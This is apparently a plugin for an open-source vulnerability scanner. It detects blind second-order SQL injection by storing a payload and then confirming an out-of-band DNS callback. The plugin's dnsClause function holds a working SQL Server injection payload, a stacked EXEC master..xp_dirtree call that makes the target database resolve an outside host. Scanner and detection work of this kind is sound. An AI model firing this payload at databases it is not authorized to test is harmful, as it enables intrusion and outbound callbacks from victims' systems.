/* ---
id: sqli-oob-second-order
name: SQL Injection (second-order, blind OOB)
description: Detects blind second-order SQL injection by storing a callback-only SQL closure at an injection point, re-reading the same point with a neutral value, and confirming only when the out-of-band resolver names the exact write/read pair.
author: GASH contributors
severity: critical
tags: [sqli, injection, second-order, blind, oob]
safe: false
deep: false
active: true
requires_auth: false
max_requests: 60
phase: probe
order: 62
oob: required
api_version: "1.0"
tests: tests/fixtures/sqli-oob-second-order/
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/sqli/sqli-oob-second-order.js
// What: Tier 2 blind second-order SQLi plugin backed by a callback-only payload.
// Why: The in-band and timing second-order plugins prove the class only when the
//   stored value produces output or a measurable delay. A stored closure that
//   merely makes the database engine resolve the operator's hostname produces
//   neither, so the only observable is the out-of-band callback. Proving it
//   needs two correlated exchanges per point (write, then neutral re-read) plus
//   one shared callback window, which a single-request Tier 1 file cannot
//   express. No new sandbox surface: host.oob.generate, host.oracles.oobAny,
//   host.candidate, probe.send and the ctx surface only.

function run(probe, ctx) {
  const points = ctx.injectionPoints();
  const maxSends = 60;
  let sends = 0;
  const sent = [];

  for (const point of points) {
    const loc = String(point.paramLocation || "query").toLowerCase();
    if (loc !== "query" && loc !== "body") {
      continue;
    }
    if (!point.paramName) {
      continue;
    }
    if (sends + 2 > maxSends) {
      break;
    }
    const oob = host.oob.generate("dns");
    if (!oob) {
      // No self-hosted server: the scheduler skips this plugin; returning an
      // empty set keeps the discipline even when it is forced to run.
      return [];
    }
    const payload = "1'" + dnsClause(oob.domain);
    // Exchange 1: store the callback-only closure.
    sends++;
    probe.send(point.withValue(payload));
    // Exchange 2: neutral re-read. Only the persisted value can fire here, so
    // a first-order echo of the payload proves nothing on its own.
    sends++;
    probe.send(point.withValue("1"));
    sent.push({ corr: oob.correlationId, ns: oob.namespace, point: point });
  }
  if (sent.length === 0) {
    return [];
  }

  // ONE shared bounded window for the whole corpus: every token is unique, so
  // the matched callback names the exact write/read pair that produced it.
  const ids = [];
  for (let i = 0; i < sent.length; i++) {
    ids.push(sent[i].corr);
  }
  const ev = host.oracles.oobAny(ids, sent[0].ns);
  if (!ev || ev.correlationId === undefined) {
    return [];
  }
  for (let i = 0; i < sent.length; i++) {
    if (sent[i].corr === String(ev.correlationId)) {
      return [host.candidate(sent[i].point, "oob", ev)];
    }
  }
  return [];
}

// dnsClause makes the database engine resolve the operator host. It reads no
// table, writes no row and executes no command; the resolver hit is the whole
// signal, which is what a blind second-order write needs.
function dnsClause(domain) {
  return "; EXEC master..xp_dirtree '\\\\" + domain + "\\gash'-- ";
}
